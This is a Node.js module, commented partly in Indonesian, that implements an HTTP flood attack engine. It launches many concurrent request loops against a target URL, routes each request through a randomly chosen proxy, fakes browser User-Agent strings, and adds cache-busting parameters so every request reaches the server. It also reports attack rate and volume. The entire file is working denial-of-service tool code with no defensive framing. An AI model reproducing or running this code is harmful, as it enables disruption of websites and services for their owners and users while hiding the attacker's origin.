
// ============================================
// 🔥 ATTACK MANAGER - ENGINE SERANGAN 🔥
// ============================================

const axios = require('axios');
const HttpsProxyAgent = require('https-proxy-agent');
const SocksProxyAgent = require('socks-proxy-agent');

class AttackManager {
    constructor(target, threadCount, proxies, logger) {
        this.target = target;
        this.threadCount = threadCount;
        this.proxies = proxies;
        this.logger = logger;
        this.running = false;
        this.stats = {
            total: 0,
            success: 0,
            fail: 0,
            bytes: 0,
            startTime: Date.now(),
            target: target,
            threads: 0
        };
        this.updateCallback = null;
    }

    getRandomProxy() {
        if (!this.proxies || this.proxies.length === 0) return null;
        return this.proxies[Math.floor(Math.random() * this.proxies.length)];
    }

    async attack() {
        while (this.running) {
            try {
                const proxy = this.getRandomProxy();
                const agent = proxy ? new HttpsProxyAgent(`http://${proxy}`) : null;
                
                const headers = {
                    'User-Agent': this.randomUA(),
                    'Accept': '*/*',
                    'Cache-Control': 'no-cache'
                };

                const url = this.target + 
                    (this.target.includes('?') ? '&' : '?') + 
                    `cache=${Math.random()}&t=${Date.now()}`;

                const response = await axios({
                    method: 'GET',
                    url: url,
                    headers: headers,
                    httpsAgent: agent,
                    timeout: 5000,
                    validateStatus: false
                });

                this.stats.total++;
                if (response.status === 200) {
                    this.stats.success++;
                } else {
                    this.stats.fail++;
                }
                this.stats.bytes += JSON.stringify(response.data).length / 1024 / 1024;

            } catch (err) {
                this.stats.total++;
                this.stats.fail++;
            }
        }
    }

    randomUA() {
        const uas = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) Mobile/15E148',
            'Mozilla/5.0 (Linux; Android 14) Chrome/120.0.6099.43 Mobile'
        ];
        return uas[Math.floor(Math.random() * uas.length)];
    }

    start(updateCallback) {
        this.running = true;
        this.updateCallback = updateCallback;
        this.stats.startTime = Date.now();

        // MULAI THREAD
        for (let i = 0; i < this.threadCount; i++) {
            setTimeout(() => this.attack(), i * 5);
        }
        this.stats.threads = this.threadCount;

        // UPDATE STATUS TIAP 30 DETIK
        this.interval = setInterval(() => {
            if (this.updateCallback) {
                const elapsed = (Date.now() - this.stats.startTime) / 1000;
                const rate = this.stats.total / elapsed;
                
                this.updateCallback({
                    elapsed: Math.floor(elapsed),
                    total: this.stats.total.toLocaleString(),
                    success: this.stats.success.toLocaleString(),
                    fail: this.stats.fail.toLocaleString(),
                    rate: Math.floor(rate),
                    bytes: this.stats.bytes.toFixed(2),
                    threads: this.stats.threads
                });
            }
        }, 30000);
    }

    stop() {
        this.running = false;
        clearInterval(this.interval);
        this.logger.log('Attack stopped by user');
    }

    getStats() {
        const elapsed = (Date.now() - this.stats.startTime) / 1000;
        const rate = this.stats.total / elapsed;
        
        return {
            target: this.target,
            elapsed: Math.floor(elapsed),
            total: this.stats.total,
            success: this.stats.success,
            fail: this.stats.fail,
            rate: Math.floor(rate),
            bytes: this.stats.bytes.toFixed(2),
            threads: this.threadCount
        };
    }
}

module.exports = AttackManager;
